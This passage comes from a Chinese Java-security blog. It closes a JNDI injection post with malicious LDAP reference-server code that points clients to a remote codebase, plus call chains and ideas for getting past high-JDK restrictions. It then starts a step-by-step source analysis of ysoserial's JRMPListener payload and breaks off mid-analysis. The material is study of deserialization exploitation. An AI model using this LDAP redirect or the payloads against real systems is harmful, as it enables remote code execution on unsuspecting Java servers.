class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://127.0.0.1:9999/test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恶意test类与RMI+Reference一致，同样也需要开启web服务供客户端远程加载恶意类<br>调用链如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">189</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">main:<span class="number">8</span>, LdapClient (JNDI)</span><br></pre></td></tr></table></figure>

<p>攻击过程与上述RMI+Reference一致，但是使用LDAP不受com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>版本限制</strong>：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230717192458.png"></p>
<ul>
<li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。</li>
<li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。</li>
<li>JDK 6u211、7u201、8u191之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止LDAP协议使用远程codebase的选项。</li>
</ul>
<p>打开方式，程序启动时加上：<br><code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code></p>
<h1 id="更高版本绕过限制"><a href="#更高版本绕过限制" class="headerlink" title="更高版本绕过限制"></a>更高版本绕过限制</h1><p>针对于JDK8u191+等更高版本的限制，可以使用下面方式进行绕过</p>
<ul>
<li>利用本地的类作为Reference的Factory<br>在上述代码分析过程中，首先会在本地的ClassPath中寻找Reference Factory Class，在本地没有找到的情况下，再从远程的地址上加载恶意类。现在更高版本限制了远程的加载，故可以从本地的类入手<br>本地的类需要满足以下条件：实现了javax.naming.spi.ObjectFactory接口并至少存在getObjectInstance()方法<br>而Tomcat依赖包中存在一个org.apache.naming.factory.BeanFactory满足以上条件并存在利用的可能</li>
<li>利用LDAP返回序列化数据，触发本地的Gatget链<br>例如与本地的CC链、FastJson组件、JdbcRowSetImpl等进行组合利用</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://fynch3r.github.io/%E6%90%9E%E6%87%82JNDI/">搞懂JNDI | fynch3r的小窝</a><br><a href="https://www.cnblogs.com/nice0e3/p/13958047.html">Java安全之JNDI注入 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://www.cnblogs.com/R0ser1/p/15873446.html">JDNI及其LADP学习 - R0ser1 - 博客园 (cnblogs.com)</a><br><a href="https://xz.aliyun.com/t/12277">JNDI注入原理及利用考究</a><br><a href="https://xz.aliyun.com/t/6633">JNDI注入原理及利用</a><br>更高版本绕过限制参考：<br><a href="https://paper.seebug.org/942/">如何绕过高版本 JDK 的限制进行 JNDI 注入利用 (seebug.org)</a><br><a href="https://www.cnblogs.com/yyhuni/p/8u191_jndi_inject.html">8u191后的JNDI注入利用 - Atomovo - 博客园 (cnblogs.com)</a><br><a href="https://xz.aliyun.com/t/8214#toc-1">JNDI注入学习</a><br><a href="https://xz.aliyun.com/t/7264">搞懂RMI、JRMP、JNDI-终结篇</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之ysoserial JRMP分析</title>
    <url>/2023/08/10/JRMP/</url>
    <content><![CDATA[<h1 id="相关类"><a href="#相关类" class="headerlink" title="相关类"></a>相关类</h1><p><strong>sun.rmi.transport.tcp.TCPEndpoint</strong>：用于表示基于 TCP 的远程通信终点（endpoint）的类。它包含了远程主机的主机名（hostname）和端口号（port number），用于建立 TCP 连接。<br>此类主要用于在 Java RMI 中表示 TCP 通信的终点，它指定了远程主机的主机名和端口号。在 Java RMI 的远程对象调用过程中，TCPEndpoint 用于建立与远程主机的 TCP 连接，并进行网络通信<br><strong>java.rmi.server.ObjID</strong>：用于在 Java RMI 中唯一标识远程对象。每个远程对象都具有一个唯一的 ObjID。这些标识符用于在远程通信中识别和定位对象。<br><strong>sun.rmi.server.UnicastRef</strong>：用于表示单播（Unicast）通信模式下的远程引用。它实现了 RemoteRef 接口，用于在远程对象之间进行通信。<br><strong>sun.rmi.transport.LiveRef</strong>：用于表示远程对象的活动引用，其中包含了远程对象的通信地址、通信端口和标识符等信息。它在 Java RMI 的远程对象调用过程中被使用，以便建立与远程对象的通信连接并进行远程方法调用。<br><strong>java.rmi.server.RemoteObjectInvocationHandler</strong>：用于在 Java RMI 中实现代理模式，充当远程对象的调用处理程序。当客户端通过代理对象调用远程对象的方法时，RemoteObjectInvocationHandler 接收到方法调用并将其转发给远程对象。它负责处理与远程对象之间的通信和结果的返回。<br><strong>sun.rmi.server.UnicastServerRef</strong>：UnicastServerRef 类是 Java RMI 中用于实现基于单播通信方式的服务器端引用的关键类。它负责管理服务器端引用的创建、通信和远程方法调用的转发，以及序列化和反序列化等功能。<br><strong>sun.rmi.transport.Target</strong>：是 Java RMI 中用于封装远程对象信息和远程通信目标的类。它包含了远程对象本身、骨架、目标地址和对象标识符等信息，用于在远程通信中确定目标并进行相应的处理。<br><strong>java.rmi.dgc.DGC</strong>:是 Java RMI 框架中实现分布式垃圾回收的核心组件之一。它通过管理远程对象的生命周期和执行垃圾回收操作，确保远程对象的资源能够被正确释放，从而提高系统的性能和可靠性。<br><strong>sun.rmi.transport.DGCImpl_Skel</strong>:是 Java RMI 框架中实现分布式垃圾回收的关键组件之一。它作为服务器端的骨架类，接收远程垃圾回收调用请求，并将其分派给具体的垃圾回收实现。通过该类的协作，可以实现远程对象的垃圾回收功能，并确保资源的释放和系统的可靠性。</p>
<h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><h2 id="生成payload复现"><a href="#生成payload复现" class="headerlink" title="生成payload复现"></a>生成payload复现</h2><p><strong>环境设置</strong>：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809204906.png"><br>最终生成payload</p>
<h2 id="payloads-JRMPListener生成payload"><a href="#payloads-JRMPListener生成payload" class="headerlink" title="payloads.JRMPListener生成payload"></a>payloads.JRMPListener生成payload</h2><p>生成Payload Object的主要在于JRMPListener的getObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> UnicastRemoteObject <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 端口</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">jrmpPort</span> <span class="operator">=</span> Integer.parseInt(command);</span><br><span class="line">    <span class="type">UnicastRemoteObject</span> <span class="variable">uro</span> <span class="operator">=</span> Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">        RemoteRef.class</span><br><span class="line">    &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(jrmpPort)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Reflections.getField(UnicastRemoteObject.class, <span class="string">&quot;port&quot;</span>).set(uro, jrmpPort);</span><br><span class="line">    <span class="keyword">return</span> uro;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在程序第二句使用Reflections.createWithConstructor方法构造一个UnicastRemoteObject对象，传递了四个参数<br>观察传入的第四个参数，将端口作为参数new一个UnicastServerRef对象，进入该类构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(<span class="type">int</span> var1)</span> &#123;</span><br><span class="line">    <span class="comment">// LiveRef是UnicastServerRef的父类UnicastRef的嵌套类，它表示一个远程对象的引用</span></span><br><span class="line">    <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(var1));</span><br><span class="line">    <span class="built_in">this</span>.forceStubUse = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.hashToMethod_Map = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入LiveRef的构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(<span class="type">int</span> var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(), var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续进入ObjID的构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjID</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * If generating random object numbers, create a new UID to</span></span><br><span class="line"><span class="comment">        * ensure uniqueness; otherwise, use a shared UID because</span></span><br><span class="line"><span class="comment">        * sequential object numbers already ensure uniqueness.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    <span class="keyword">if</span> (useRandomIDs()) &#123;</span><br><span class="line">        <span class="comment">// 如果使用随机对象编号，创建一个新的UID对象，并将其赋值给space字段。UID是Java中的唯一标识符，用于表示全局唯一的标识符</span></span><br><span class="line">        space = <span class="keyword">new</span> <span class="title class_">UID</span>();</span><br><span class="line">        <span class="comment">// 生成一个随机的long类型的对象编号</span></span><br><span class="line">        objNum = secureRandom.nextLong();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        space = mySpace;</span><br><span class="line">        objNum = nextObjNum.getAndIncrement();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回至LiveRef的构造函数，进行了构造函数的重载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID var1, <span class="type">int</span> var2)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(var1, TCPEndpoint.getLocalEndpoint(var2), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中var1是获取的objID，第二个参数经过了一个方法处理，传入的参数是端口<br>进入TCPEndpoint.getLocalEndpoint方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TCPEndpoint <span class="title function_">getLocalEndpoint</span><span class="params">(<span class="type">int</span> var0)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getLocalEndpoint(var0, (RMIClientSocketFactory)<span class="literal">null</span>, (RMIServerSocketFactory)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里也是对方法的重构，进入重构的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TCPEndpoint <span class="title function_">getLocalEndpoint</span><span class="params">(<span class="type">int</span> var0, RMIClientSocketFactory var1, RMIServerSocketFactory var2)</span> &#123;</span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 对localEndpoints对象进行同步锁定，确保线程安全</span></span><br><span class="line">    <span class="keyword">synchronized</span>(localEndpoints) &#123;</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>((String)<span class="literal">null</span>, var0, var1, var2);</span><br><span class="line">        <span class="comment">// 根据var5从localEndpoints中获取对应的端点列表</span></span><br><span class="line">        <span class="type">LinkedList</span> <span class="variable">var6</span> <span class="operator">=</span> (LinkedList)localEndpoints.get(var5);</span><br><span class="line">        <span class="comment">// 调用resampleLocalHost()方法获取本地主机地址</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">var7</span> <span class="operator">=</span> resampleLocalHost();</span><br><span class="line">        <span class="comment">// 表示还没有对应的端点存在</span></span><br><span class="line">        <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 创建一个新的TCPEndpoint对象，使用本地主机地址var7、端口号var0以及指定的RMIClientSocketFactory和RMIServerSocketFactory</span></span><br><span class="line">            var3 = <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(var7, var0, var1, var2);</span><br><span class="line">            <span class="comment">// 创建一个新的LinkedList用于存储端点对象</span></span><br><span class="line">            var6 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">            var6.add(var3);</span><br><span class="line">            var3.listenPort = var0;</span><br><span class="line">            <span class="comment">// 创建一个新的TCPTransport对象，并将端点列表作为参数传递给它</span></span><br><span class="line">            var3.transport = <span class="keyword">new</span> <span class="title class_">TCPTransport</span>(var6);</span><br><span class="line">            <span class="comment">// 将端点列表添加到localEndpoints映射中，以var5为键</span></span><br><span class="line">            localEndpoints.put(var5, var6);</span><br><span class="line">            <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                TCPTransport.tcpLog.log(Log.BRIEF, <span class="string">&quot;created local endpoint for socket factory &quot;</span> + var2 + <span class="string">&quot; on port &quot;</span> + var0);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 存在端点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(var6) &#123;</span><br><span class="line">                <span class="comment">// 获取列表中的最后一个端点对象</span></span><br><span class="line">                var3 = (TCPEndpoint)var6.getLast();</span><br><span class="line">                <span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> var3.host;</span><br><span class="line">                <span class="type">int</span> <span class="variable">var10</span> <span class="operator">=</span> var3.port;</span><br><span class="line">                <span class="type">TCPTransport</span> <span class="variable">var11</span> <span class="operator">=</span> var3.transport;</span><br><span class="line">                <span class="comment">// 如果本地主机地址var7不为null且与最后一个端点的主机地址var9不相等</span></span><br><span class="line">                <span class="keyword">if</span> (var7 != <span class="literal">null</span> &amp;&amp; !var7.equals(var9)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (var10 != <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// 清空端点列表</span></span><br><span class="line">                        var6.clear();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var3 = <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(var7, var10, var1, var2);</span><br><span class="line">                    var3.listenPort = var0;</span><br><span class="line">                    var3.transport = var11;</span><br><span class="line">                    var6.add(var3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法主要是用于获取本地端点对象，在第一个if条件下变量的值如下图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230806223651.png"><br>接下来继续执行<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230806223940.png"><br>最后返回var3<br>回到LiveRef的构造函数，继续调用重载函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID var1, Endpoint var2, <span class="type">boolean</span> var3)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.ep = var2;</span><br><span class="line">    <span class="built_in">this</span>.id = var1;</span><br><span class="line">    <span class="built_in">this</span>.isLocal = var3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230806224749.png"><br>紧接着一致返回，来到UnicastServerRef对象的构造函数，参数是上面获取的LiveRef对象，调用父类构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.ref = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时前面提到的第四个参数中构建UnicastServerRef对象的步骤完成，主要是将其ref属性赋值为LiveRef对象</p>
<blockquote>
<p>LiveRef是Java RMI中用于管理远程对象引用的类，它提供了远程通信所需的信息和功能，以使代理对象能够与远程对象进行交互</p>
</blockquote>
<p>继续观察createWithConstructor方法的内部实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br><span class="line">        <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">    setAccessible(objCons);</span><br><span class="line">    <span class="comment">// 创建一个特殊的构造函数对象，以便在对象序列化期间使用</span></span><br><span class="line">    Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">    setAccessible(sc);</span><br><span class="line">    <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>classToInstantiate：要实例化的类的Class对象</li>
<li>constructorClass：构造函数所在类的Class对象</li>
<li>consArgTypes：构造函数的参数类型数组</li>
<li>consArgs：构造函数的参数值数组</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230806163523.png"><br>执行完构造函数后，返回至getObject方法，最后使用Reflections.getField方法将得到的UnicastRemoteObject对象的port属性设置为传入的端口的值，然后将对象返回。<br>最后将得到的ActivationGroupImpl对象进行序列化得到payload</p>
<h2 id="payload反序列化复现"><a href="#payload反序列化复现" class="headerlink" title="payload反序列化复现"></a>payload反序列化复现</h2><p><strong>环境设置</strong>：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809205735.png"><br>这一步其实包括上面的payload生成，只是在先写前面的部分未考虑后面的部分，现在分析对前面步骤生成的payload任何进行反序列化</p>
<h2 id="payloads-JRMPListener-payload反序列化"><a href="#payloads-JRMPListener-payload反序列化" class="headerlink" title="payloads.JRMPListener payload反序列化"></a>payloads.JRMPListener payload反序列化</h2><p>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">listen:<span class="number">319</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">249</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">411</span>, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">147</span>, LiveRef (sun.rmi.transport)</span><br><span class="line">exportObject:<span class="number">208</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">exportObject:<span class="number">383</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">exportObject:<span class="number">320</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">reexport:<span class="number">266</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">readObject:<span class="number">235</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">deserialize:<span class="number">27</span>, Deserializer (ysoserial)</span><br><span class="line">deserialize:<span class="number">22</span>, Deserializer (ysoserial)</span><br><span class="line">run:<span class="number">38</span>, PayloadRunner (ysoserial.payloads.util)</span><br><span class="line">main:<span class="number">55</span>, JRMPListener (ysoserial.payloads)</span><br></pre></td></tr></table></figure>

<p>由前面生成的payload可知，序列化的对象是UnicastRemoteObject对象，现在对payload进行反序列化，故会调用UnicastRemoteObject的readObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    <span class="comment">// 进入这里</span></span><br><span class="line">    reexport();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入reexport方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reexport</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (csf == <span class="literal">null</span> &amp;&amp; ssf == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 进入这里</span></span><br><span class="line">        exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        exportObject((Remote) <span class="built_in">this</span>, port, csf, ssf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的this是ActivationGroupImpl对象，它继承了ActivationGroup类，而ActivationGroup类继承了UnicastRemoteObject类，归根结底是UnicastRemoteObject的子类，而UnicastRemoteObject继承了RemoteServer类，RemoteServer继承了RemoteObject类，RemoteObject类继承了Remote接口，所以这里强制转换没有问题，传入的依旧是ActivationGroupImpl类<br>csf和ssf都为null，进入exportObject重载方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续进入UnicastRemoteObject类的重载方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面提到obj是ActivationGroupImp对象，故不会进入if，这里的sref是上一步传入的UnicastServerRef对象，故进入该类的exportObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote var1, Object var2, <span class="type">boolean</span> var3)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 获取要导出的远程对象的类</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getClass();</span><br><span class="line"></span><br><span class="line">    Remote var5;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建代理对象</span></span><br><span class="line">        <span class="comment">// 该方法会根据指定的类、客户端引用和强制存根使用的标志来创建代理对象</span></span><br><span class="line">        var5 = Util.createProxy(var4, <span class="built_in">this</span>.getClientRef(), <span class="built_in">this</span>.forceStubUse);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;remote object implements illegal remote interface&quot;</span>, var7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查代理对象类型</span></span><br><span class="line">    <span class="keyword">if</span> (var5 <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">        <span class="built_in">this</span>.setSkeleton(var1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建 Target 对象</span></span><br><span class="line">    <span class="comment">// 该对象封装了要导出的远程对象、UnicastRemoteObject 对象、代理对象、对象标识符和是否启用存根的标志</span></span><br><span class="line">    <span class="type">Target</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Target</span>(var1, <span class="built_in">this</span>, var5, <span class="built_in">this</span>.ref.getObjID(), var3);</span><br><span class="line">    <span class="comment">// 导出远程对象</span></span><br><span class="line">    <span class="comment">// 进入这里</span></span><br><span class="line">    <span class="built_in">this</span>.ref.exportObject(var6);</span><br><span class="line">    <span class="built_in">this</span>.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);</span><br><span class="line">    <span class="keyword">return</span> var5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此方法用于导出一个远程对象，并返回一个代理对象。这里的this.ref是LiveRef对象，进入该类的exportObject方法，传入的参数是Target对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809225958.png"><br>LiveRef的exportObject方法</p>
